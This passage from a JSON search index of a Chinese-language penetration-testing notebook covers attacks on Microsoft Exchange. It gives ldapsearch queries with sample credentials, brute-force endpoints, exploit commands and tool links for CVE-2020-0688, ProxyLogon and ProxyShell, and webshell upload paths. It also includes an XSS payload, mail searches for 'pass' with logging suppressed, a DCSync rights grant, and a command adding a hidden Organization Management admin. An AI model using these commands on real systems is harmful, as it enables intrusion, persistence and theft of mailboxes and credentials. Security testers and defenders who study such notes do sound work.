Time\"}}},\"Body\":{\"__type\":\"FindPeopleRequest:#Exchange\",\"IndexedPageItemView\":{\"__type\":\"IndexedPageView:#Exchange\",\"BasePoint\":\"Beginning\",\"Offset\":0,\"MaxEntriesReturned\":500},\"QueryString\":null,\"ParentFolderId\":{\"__type\":\"TargetFolderId:#Exchange\",\"BaseFolderId\":{\"__type\":\"AddressListId:#Exchange\",\"Id\":\"6230e129-096c-4f6a-8140-0f20d1230639\"}},\"PersonaShape\":{\"__type\":\"PersonaResponseShape:#Exchange\",\"BaseShape\":\"Default\"}}} ldap\u67e5\u8be2\u5bfc\u51fa ldapsearch -x -h 192.168.0.66 -D \"test@klion.local\" -w Aa123456 -b \"DC=klion,DC=local\" |grep mail:","title":"Exchange\u653b\u51fb\u9762"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#title-exchange-date-2021-11-09-101320","text":"","title":"title: Exchange\u653b\u51fb\u9762 date: 2021-11-09 10:13:20"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#exchange","text":"","title":"\u5728\u5185\u7f51\u4e2d\u5b9a\u4f4dexchange"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#ldapsearch","text":"\u8fc7\u6ee4\u6761\u4ef6\u53ef\u4ee5\u662f cn=Exchange Servers name=Exchange Servers sAMAccountName=Exchange Servers ldapsearch -x -h 192.168.0.66 -D \"test@klion.local\" -b \"DC=klion,DC=local\" -w \"Aa123456\" \"cn=Exchange Servers\"","title":"ldapsearch"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#spn","text":"\u9700\u8981\u5728\u57df\u5185 setspn -Q IMAP/*","title":"SPN\u67e5\u8be2"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#_1","text":"\u6839\u636eF12\u4e2d\u7684\u5185\u90e8\u7248\u672c\u53f7\u6765\u67e5\u8be2\uff0c\u598215.2.986.9 https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019","title":"\u7248\u672c\u8bc6\u522b"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#shell","text":"| FileName | Path | | ------------ | ------------------------------------------------------------------------- | | zz.aspx | C:\\ProgramFiles\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth | | zz.ashx | C:\\inetpub\\wwwroot\\aspnet_client | | zz.ashx | C:\\ProgramFiles\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth |","title":"\u53ef\u4e0a\u4f20shell\u7684\u8def\u5f84"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#_2","text":"","title":"\u679a\u4e3e\u7528\u6237"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#_3","text":"\u5206\u5e38\u89c4\u7206\u7834\u548cNTLM\u9a8c\u8bc1\u7206\u7834\uff0c\u5bf9\u4e8e\u9650\u5236\u4e86\u767b\u5f55\u6b21\u6570\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5bf9NTLM\u9a8c\u8bc1\u7684\u63a5\u53e3\u8fdb\u884c\u7206\u7834\uff0c\u5e38\u7528\u63a5\u53e3\u5982\u4e0b /Autodiscover/Autodiscover.xml # \u81ea Exchange Server 2007 \u5f00\u59cb\u63a8\u51fa\u7684\u4e00\u9879\u81ea\u52a8\u670d\u52a1,\u7528\u4e8e\u81ea\u52a8\u914d\u7f6e\u7528\u6237\u5728Outlook\u4e2d\u90ae\u7bb1\u7684\u76f8\u5173\u8bbe\u7f6e,\u7b80\u5316\u7528\u6237\u767b\u5f55\u4f7f\u7528\u90ae\u7bb1\u7684\u6d41\u7a0b\u3002 /Microsoft-Server-ActiveSync/default.eas /Microsoft-Server-ActiveSync # \u7528\u4e8e\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u7535\u5b50\u90ae\u4ef6 /Autodiscover /Rpc/ # \u65e9\u671f\u7684 Outlook \u8fd8\u4f7f\u7528\u79f0\u4e3a Outlook Anywhere \u7684 RPC \u4ea4\u4e92 /EWS/Exchange.asmx /EWS/Services.wsdl /EWS/ # Exchange Web Service,\u5b9e\u73b0\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u4e4b\u95f4\u57fa\u4e8eHTTP\u7684SOAP\u4ea4\u4e92 /OAB/ # \u7528\u4e8e\u4e3aOutlook\u5ba2\u6237\u7aef\u63d0\u4f9b\u5730\u5740\u7c3f\u7684\u526f\u672c,\u51cf\u8f7b Exchange \u7684\u8d1f\u62c5 /owa # Exchange owa \u63a5\u53e3,\u7528\u4e8e\u901a\u8fc7web\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u90ae\u4ef6\u3001\u65e5\u5386\u3001\u4efb\u52a1\u548c\u8054\u7cfb\u4eba\u7b49 /ecp # Exchange \u7ba1\u7406\u4e2d\u5fc3,\u7ba1\u7406\u5458\u7528\u4e8e\u7ba1\u7406\u7ec4\u7ec7\u4e2d\u7684Exchange \u7684Web\u63a7\u5236\u53f0 /Mapi # Outlook\u8fde\u63a5 Exchange \u7684\u9ed8\u8ba4\u65b9\u5f0f,\u57282013\u548c2013\u4e4b\u540e\u5f00\u59cb\u4f7f\u7528,2010 sp2\u540c\u6837\u652f\u6301 /powershell # \u7528\u4e8e\u670d\u52a1\u5668\u7ba1\u7406\u7684 Exchange \u7ba1\u7406\u63a7\u5236\u53f0","title":"\u7206\u7834\u5bc6\u7801"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#burpowa","text":"owa\u767b\u5f55\u53e3\u7206\u7834\uff0c\u7b80\u5355\u7c97\u66b4","title":"burp\u7206\u7834OWA"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#autodiscover","text":"\u5bf9NTLM\u9a8c\u8bc1\u7206\u7834\uff0cuser\u662f\u4ee5\u7528\u6237\u540d\u5f62\u5f0f https://github.com/sensepost/ruler","title":"autodiscover\u63a5\u53e3\u7206\u7834"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#eburstntlm","text":"https://github.com/grayddq/EBurst \u652f\u6301\u591a\u4e2a\u63a5\u53e3\u7206\u7834\uff0c\u5982\u679c\u8981\u6b63\u5e38\u4f7f\u7528\u8fd8\u9700\u8981\u4fee\u6539\u811a\u672c\u3002\u5173\u4e8eSSL\u8bc1\u4e66\u7684\u95ee\u9898\u3002 \u4f7f\u7528\u524d\u5148\u68c0\u6d4b\u63a5\u53e3\u53ef\u7528\u6027","title":"EBurst\u6279\u91cf\u63a5\u53e3NTLM\u7206\u7834"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2019-1040","text":"\u9002\u7528\u5185\u7f51\uff0c\u4e2d\u7ee7\u653b\u51fb\u3002 https://github.com/Ridter/CVE-2019-1040","title":"CVE-2019-1040"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2020-0688-rce","text":"\u5bc6\u94a5\u786c\u7f16\u7801\u5bfc\u81f4\u7684\u53cd\u5e8f\u5217RCE\uff0c\u7b80\u5355\u7c97\u66b4\uff0c\u9700\u8981\u4e00\u4e2a\u7528\u6237 .\\ExchangeCmd.exe 192.168.0.16 test@klion.local Aa123456","title":"CVE-2020-0688-\u9700\u8981\u8ba4\u8bc1\u7684\u53cd\u5e8f\u5217\u5316RCE"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2020-16875","text":"\u53cd\u5e8f\u5217\u5316\uff0c\u811a\u672c\u76f4\u63a5\u5229\u7528\uff0c\u6267\u884c\u547d\u4ee4\uff0c\u9700\u8981\u4e00\u4e2a\u7528\u6237 https://srcincite.io/pocs/cve-2020-16875.py.txt","title":"CVE-2020-16875"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2020-17144-exchange2010","text":"\u53ea\u80fd\u62532010\uff0cC#\u5de5\u5177\u5229\u7528\uff0c\u4fee\u6539ExploitClass.cs\u6765\u6307\u5b9ashell https://github.com/Airboi/CVE-2020-17144-EXP \u6216\u8005\u4f7f\u7528\u8fd9\u4e2a\u6765\u76f4\u63a5\u5199shell https://github.com/zcgonvh/CVE-2020-17144","title":"CVE-2020-17144-Exchange2010"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#proxylogon-rce","text":"\u8fd9\u4e2apython3 https://github.com/p0wershe11/ProxyLogon \u8fd9\u4e2apython2 https://github.com/hausec/ProxyLogon","title":"ProxyLogon-\u7ec4\u5408RCE"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2021-26855ssrf","text":"\u65e0\u9700\u8eab\u4efd\u9a8c\u8bc1\u7684SSRF\u6f0f\u6d1e\u5bfc\u81f4\u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7\u3002","title":"CVE-2021-26855\uff08SSRF\uff09"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2021-27065","text":"\u9700\u8981\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u4efb\u610f\u6587\u4ef6\u5199\u5165\u6f0f\u6d1e\u5bfc\u81f4RCE\u3002","title":"CVE-2021-27065\uff08\u4efb\u610f\u6587\u4ef6\u5199\u5165\uff09"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#proxyoracle-","text":"\u5229\u7528xss\u62ff\u5230cookie\u540e\u8fdb\u884cPadding Oracle\uff0c\u53ef\u80fd\u62ff\u5230\u8d26\u6237\u5bc6\u7801\uff1f","title":"ProxyOracle-\u6ca1\u591a\u5927\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2021-31195-","text":"/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\\&refurl=}}};alert(document.domain)//","title":"CVE-2021-31195-\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2021-31196-padding-oracle","text":"","title":"CVE-2021-31196-Padding Oracle"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#proxyshell-rce","text":"CVE-2021-34473+CVE-2021-34523+CVE-2021-31207","title":"ProxyShell-\u7ec4\u5408RCE"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#rce","text":"\u6ce8\uff1a\u4efb\u610f\u6587\u4ef6\u5199\u5165\u7684\u5b9e\u73b0\u65b9\u5f0f\u5728\u4e00\u952e\u811a\u672c\u4e2d\u662f\u91c7\u53d6\u53d1\u9001\u4e00\u5c01\u90ae\u4ef6\u518d\u8fdb\u884c\u5bfc\u51fa\u90ae\u4ef6\u7684\u65b9\u5f0f 1\u3001\u4f7f\u7528WsMan\u534f\u8bae\u8c03\u7528exchange powershell\u63a5\u53e3\u7684New-MailboxExportRequest 2\u3001\u4f7f\u7528PST\u7f16\u7801\u5f02\u6216\u4e00\u6b21\u7684payload\uff0c\u4ee5\u4fbf\u8ba9\u90ae\u4ef6\u5bfc\u51fa\u65f6\u7684payload\u80fd\u591f\u5f97\u5230\u89e3\u7801 payload\u52a0\u5bc6\u5de5\u5177https://github.com/Ridter/proxyshell_payload 3\u3001\u7136\u540e\u4f7f\u7528\u5f97\u5230\u7684token\uff0c\u5c06\u52a0\u5bc6\u7684payload \u53d1\u9001\u6307\u5b9a\u63a5\u53e3","title":"RCE\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#_4","text":"python .\\exchange_ssrf_attacks.py --target 1.1.1.1 --action Get \u6216\u8005 python .\\proxyshell-enumerate.py -u https://1.1.1.1/","title":"\u5148\u786e\u5b9a\u5b58\u5728\u7684\u90ae\u7bb1"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#_5","text":"https://github.com/dmaasland/proxyshell-poc/blob/main/proxyshell_rce.py https://github.com/Udyz/proxyshell-auto/blob/main/proxyshell.py \u81ea\u52a8\u679a\u4e3e\u90ae\u7bb1 python .\\proxyshell.py -t 1.1.1.1 \u4e0a\u9762\u8fd9\u4e2a\u5de5\u5177\u53ef\u63a7\u5236\u5199\u5165\u7684payload\uff0c\u6307\u5b9apayload\u53c2\u6570\u6765\u63a7\u5236webshell\u7684\u5185\u5bb9 \u6307\u5b9a\u90ae\u7bb1 python .\\proxyshell_rce.py -u https://1.1.1.1 -e ac@exp.com \u4e0a\u9762\u8fd9\u4e2a\u5de5\u5177\u662f\u76f4\u63a5\u628a\u52a0\u5bc6\u597d\u7684payload\u5199\u8fdb\u53bb\u4e86\u3002 \u5982\u4e0b\u56feproxyshell.py\u5931\u8d25\u4e86\uff0c\u4f46proxyshell_rce.py\u6210\u529f\u4e86\u3002proxyshell_rce.py\u6548\u679c\u4f3c\u4e4e\u6bd4proxyshell.py\u66f4\u597d\u7528","title":"\u4e00\u952e\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#rce_1","text":"https://github.com/Jumbo-WJB/Exchange_SSRF","title":"\u6ca1\u6cd5RCE\u4f46\u5b58\u5728\u6f0f\u6d1e\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u529e\u6cd5"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#_6","text":"python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Brute --file /tmp/emails.txt","title":"\u679a\u4e3e\u90ae\u7bb1"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#_7","text":"python Exchange_SSRF_Attacks.py --target mail.exchange.com --action SearchC --email validuser@exchange.com --keyword test","title":"\u6307\u5b9a\u7528\u6237\u641c\u7d22\u8054\u7cfb\u4eba"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#_8","text":"python Exchange_SSRF_Attacks.py --target mail.exchange.com --action SearchM --email userwantdown@exchange.com --keyword password","title":"\u641c\u7d22\u90ae\u4ef6\u5e76\u4e0b\u8f7d"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#_9","text":"python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Download --email userwantdown@exchange.com","title":"\u4e0b\u8f7d\u6307\u5b9a\u90ae\u7bb1\u7684\u90ae\u4ef6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2021-33768-","text":"","title":"CVE-2021-33768-\u6682\u65e0"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#exchange_1","text":"","title":"Exchange\u540e\u6e17\u900f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#exchange_2","text":"powershell -exec bypass -command Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;Get-Mailbox | format-table Name,WindowsEmailAddress","title":"\u4eceexchange\u670d\u52a1\u4e0a\u83b7\u53d6\u90ae\u7bb1\u3001\u7528\u6237"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#exchangedcsync","text":"\u4f7f\u7528powerview\u4e3aexchange\u673a\u5668\u7528\u6237\u6dfb\u52a0dcsync\u6743\u9650 PS>Import-Module .\\powerview.ps1 PS>Add-DomainObjectAcl -TargetIdentity 'DC=test,DC=local' -PrincipalIdentity exchange2016$ -Rights DCSync -Verbose}\"","title":"\u901a\u8fc7Exchange\u8fdb\u884cdcsync"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#exchange_3","text":"\u5b9e\u73b0\u4ee3\u7801\u5df2\u4e0a\u4f20\u81f3github\uff0c\u5730\u5740\u5982\u4e0b\uff1a https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectSearchMailfromExchange.ps1 \u4ece\u7528\u6237test1\u4e2d\u641c\u7d22\u5305\u542b\u5355\u8bcdpass\u7684\u90ae\u4ef6\u5e76\u4fdd\u5b58\u5230\u7528\u6237test2\u7684out2\u6587\u4ef6\u5939\uff0c\u53c2\u6570\u5982\u4e0b\uff1a DirectSearchMailfromExchange -MailBox \"test1\" -Filter \"*pass*\" -TargetMailbox \"test2\" -TargetFolder \"out2\" -Version 2013 \u641c\u7d22\u6240\u6709\u5305\u542b\u5355\u8bcdpass\u7684\u90ae\u4ef6\u5e76\u4fdd\u5b58\u5230\u7528\u6237test2\u7684outAll\u6587\u4ef6\u5939\uff0c\u53c2\u6570\u5982\u4e0b\uff1a DirectSearchMailfromExchange -MailBox \"All\" -Filter \"*pass*\" -TargetMailbox \"test2\" -TargetFolder \"outAll\" -Version 2013","title":"\u5728Exchange\u670d\u52a1\u5668\u4e0a\u641c\u7d22\u90ae\u4ef6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#1","text":"(1)\u679a\u4e3e\u6240\u6709\u90ae\u7bb1\u7528\u6237\uff0c\u663e\u793a\u5305\u542b\u5173\u952e\u8bcdpass\u7684\u90ae\u4ef6\u7684\u6570\u91cf Get-Mailbox|Search-Mailbox -SearchQuery \"*pass*\" -EstimateResultOnly (2)\u641c\u7d22\u90ae\u7bb1\u7528\u6237test1\uff0c\u663e\u793a\u5305\u542b\u5173\u952e\u8bcdpass\u7684\u90ae\u4ef6\u7684\u6570\u91cf Search-Mailbox -Identity test1 -SearchQuery \"*pass*\" -EstimateResultOnly \u793a\u4f8b\u5982\u4e0b\u56fe\uff0c\u6570\u91cf\u4e3a4\u4e2a (3)\u679a\u4e3e\u6240\u6709\u90ae\u7bb1\u7528\u6237\uff0c\u5bfc\u51fa\u5305\u542b\u5173\u952e\u8bcdpass\u7684\u90ae\u4ef6\u81f3\u7528\u6237test2\u7684\u6587\u4ef6\u5939out\u4e2d(\u4e0d\u4fdd\u5b58\u65e5\u5fd7)\uff1a Get-Mailbox|Search-Mailbox -SearchQuery \"*pass*\" -TargetMailbox \"test2\" -TargetFolder \"out\" -LogLevel Suppress (4)\u641c\u7d22\u90ae\u7bb1\u7528\u6237test1\uff0c\u5bfc\u51fa\u5305\u542b\u5173\u952e\u8bcdpass\u7684\u90ae\u4ef6\u81f3\u7528\u6237test2\u7684\u6587\u4ef6\u5939out\u4e2d(\u4e0d\u4fdd\u5b58\u65e5\u5fd7)\uff1a Search-Mailbox -Identity test1 -SearchQuery \"*pass*\" -TargetMailbox \"test2\" -TargetFolder \"out\" -LogLevel Suppress","title":"\u8865\u51451\uff1a\u641c\u7d22\u90ae\u4ef6\u7684\u5e38\u7528\u547d\u4ee4"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#exchange_4","text":"","title":"\u5728Exchange\u670d\u52a1\u5668\u4e0a\u5bfc\u51fa\u90ae\u4ef6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#_10","text":"1.\u4f7f\u7528PSSession\u8fde\u63a5\u5230Exchange\u670d\u52a1\u5668 2.\u5224\u65ad\u4f7f\u7528\u7684\u7528\u6237\u662f\u5426\u88ab\u52a0\u5165\u5230\u89d2\u8272\u7ec4\u201dMailbox Import Export\u201d \u5982\u679c\u672a\u88ab\u6dfb\u52a0\uff0c\u9700\u8981\u6dfb\u52a0\u7528\u6237 3.\u5bfc\u51fa\u90ae\u4ef6\u5e76\u4fdd\u5b58\u81f3Exchange\u670d\u52a1\u5668\u7684c:\\test\uff0c\u683c\u5f0f\u4e3apst\u6587\u4ef6 4.\u5982\u679c\u65b0\u6dfb\u52a0\u4e86\u7528\u6237\uff0c\u90a3\u4e48\u4f1a\u5c06\u7528\u6237\u79fb\u9664\u89d2\u8272\u7ec4\u201dMailbox Import Export\u201d 5.\u6e05\u9664PSSession \u5bfc\u51fa\u7684pst\u6587\u4ef6\u4f7f\u7528Outlook\u6253\u5f00\u5373\u53ef (1)\u5c06\u7528\u6237\u6dfb\u52a0\u5230\u89d2\u8272\u7ec4\u201dMailbox Import Export\u201d \u8fd9\u91cc\u4ee5\u7528\u6237administrator\u4e3a\u4f8b\uff1a New-ManagementRoleAssignment \u2013Role \"Mailbox Import Export\" \u2013User Administrator \u8865\u5145\uff1a\u79fb\u9664\u7684\u547d\u4ee4 Remove-ManagementRoleAssignment -Identity \"Mailbox Import Export-Administrator\" -Confirm:$false \u6dfb\u52a0\u540e\u518d\u6b21\u67e5\u770b\u8fdb\u884c\u786e\u8ba4\uff1a Get-ManagementRoleAssignment \u2013Role \"Mailbox Import Export\"|fl user (2)\u91cd\u65b0\u542f\u52a8Powershell \u5426\u5219\uff0c\u65e0\u6cd5\u4f7f\u7528\u547d\u4ee4New-MailboxexportRequest (3)\u5bfc\u51fa\u90ae\u4ef6\u5e76\u4fdd\u5b58 1.\u5bfc\u51fa\u6307\u5b9a\u7528\u6237\u7684\u6240\u6709\u90ae\u4ef6\uff0c\u4fdd\u5b58\u5230Exchange\u670d\u52a1\u5668\u7684c:\\test $User = \"test1\" New-MailboxexportRequest -mailbox $User -FilePath (\"\\\\localhost\\c$\\test\\\"+$User+\".pst\") 2.\u7b5b\u9009\u51fa\u6307\u5b9a\u7528\u6237\u7684body\u4e2d\u5305\u542b\u5355\u8bcdpass\u7684\u90ae\u4ef6\uff0c\u4fdd\u5b58\u5230Exchange\u670d\u52a1\u5668\u7684c:\\test $User = \"test1\" New-MailboxexportRequest -mailbox $User -ContentFilter {(body -like \"*pass*\")} -FilePath (\"\\\\localhost\\c$\\test\\\"+$User+\".pst\") 3.\u5bfc\u51fa\u6240\u6709\u90ae\u4ef6\uff0c\u4fdd\u5b58\u5230Exchange\u670d\u52a1\u5668\u7684c:\\test Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%{New-MailboxexportRequest -mailbox $_.name -FilePath (\"\\\\localhost\\c$\\test\\\"+($_.name)+\".pst\")}","title":"\u7b2c\u4e00\u79cd\u65b9\u5f0f\u6d41\u7a0b\u5982\u4e0b\uff1a"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#_11","text":"\u6ce8\uff1a \u9700\u8981\u6307\u5b9aExchange\u7248\u672c \u6d41\u7a0b\u5982\u4e0b\uff1a 1.\u6dfb\u52a0\u7ba1\u7406\u5355\u5143 2.\u5bfc\u51fa\u90ae\u4ef6\u5e76\u4fdd\u5b58\u81f3Exchange\u670d\u52a1\u5668\u7684c:\\test\uff0c\u683c\u5f0f\u4e3apst\u6587\u4ef6 \u5bfc\u51fa\u7684pst\u6587\u4ef6\u4f7f\u7528Outlook\u6253\u5f00\u5373\u53ef (1)\u6dfb\u52a0\u7ba1\u7406\u5355\u5143 \u4e0d\u540cExchange\u7248\u672c\u5bf9\u5e94\u7684\u7ba1\u7406\u5355\u5143\u540d\u79f0\u4e0d\u540c\uff1a Exchange 2007: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.Admin; Exchange 2010: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Exchange 2013 & 2016: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; \u4e0d\u9700\u8981\u8003\u8651\u89d2\u8272\u7ec4\uff0c\u53ef\u4ee5\u76f4\u63a5\u5bfc\u51fa\u90ae\u4ef6 (2)\u5bfc\u51fa\u90ae\u4ef6 \u5bfc\u51fa\u7528\u6237test1\u7684\u90ae\u4ef6\uff0c\u4fdd\u5b58\u5230Exchange\u670d\u52a1\u5668\u7684c:\\test\uff1a Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; $User = \"test1\" New-MailboxexportRequest -mailbox $User -FilePath (\"\\\\localhost\\c$\\test\\\"+$User+\".pst\")","title":"\u7b2c\u4e8c\u79cd\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#exchange_5","text":"powershell -c \"Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;$pwd=convertto-securestring Password123 -asplaintext -force;New-Mailbox -UserPrincipalName testuser1@test.com -OrganizationalUnit test.com/Users -Alias testuser1 -Name testuser1 -DisplayName testuser1 -Password $pwd;Add-RoleGroupMember \\\"Organization Management\\\" -Member testuser1 -BypassSecurityGroupManagerCheck\"","title":"\u547d\u4ee4\u884c\u4e0b\u6dfb\u52a0Exchange\u7ba1\u7406\u5458\u7528\u6237"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#_12","text":"","title":"\u901a\u8baf\u5f55\u5bfc\u51fa"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#burp","text":"\u9700\u8981\u5bf9json\u683c\u5f0f\u8fdb\u884c\u5904\u7406\u4e00\u4e0b \u6570\u636e\u5305\uff0c\u4fee\u6539MaxEntriesReturned\u53c2\u6570\u6765\u5bfc\u51fa\u90ae\u7bb1\u6570\u91cf POST /owa/service.svc?action=FindPeople&ID=-25&AC=1 HTTP/1.1 Host: 192.168.0.16 Cookie: xxxx User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Action: FindPeople Content-Type: application/json; charset=utf-8 X-Owa-Canary: TbaZ2GpjckaBdewgr1Fzs6pk4PlEo9kIqjb4trHBtOg6bBXuxJYK2LUnStFgWPE33nzEigc2zMA. X-Owa-Clientbuildversion: 15.0.847.32 X-Owa-Actionname: BrowseInDirectory X-Owa-Attempt: 1 X-Owa-Actionid: -25 X-Owa-Correlationid: 8f354010-b00c-4ca4-a8bd-89c09d03aa0c_163643741326924 X-Owa-Clientbegin: 2021-11-09T05:56:53.269 Referer: https://192.168.0.16/owa/ Content-Length: 709 Dnt: 1 Connection: close {\"__type\":\"FindPeopleJsonRequest:#Exchange\",\"Header\":{\"__type\":\"JsonRequestHeaders:#Exchange\",\"RequestServerVersion\":\"Exchange2013\",\"TimeZoneContext\":{\"__type\":\"TimeZoneContext:#Exchange\",\"TimeZoneDefinition\":{\"__type\":\"TimeZoneDefinitionType:#Exchange\",\"Id\":\"SA Pacific Standard Time\"}}},\"Body\":{\"__type\":\"FindPeopleRequest:#Exchange\",\"IndexedPageItemView\":{\"__type\":\"IndexedPageView:#Exchange\",\"BasePoint\":\"Beginning\",\"Offset\":0,\"MaxEntriesReturned\":500},\"QueryString\":null,\"ParentFolderId\":{\"__type\":\"TargetFolderId:#Exchange\",\"BaseFolderId\":{\"__type\":\"AddressListId:#Exchange\",\"Id\":\"6230e129-096c-4f6a-8140-0f20d1230639\"}},\"PersonaShape\":{\"__type\":\"PersonaResponseShape:#Exchange\",\"BaseShape\":\"Default\"}}}","title":"burp\u5bfc\u51fa"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/#ldap","text":"ldapsearch -x -h 192.168.0.66 -D \"test@klion.local\" -w Aa123456 -b \"DC=klion,DC=local\" |grep 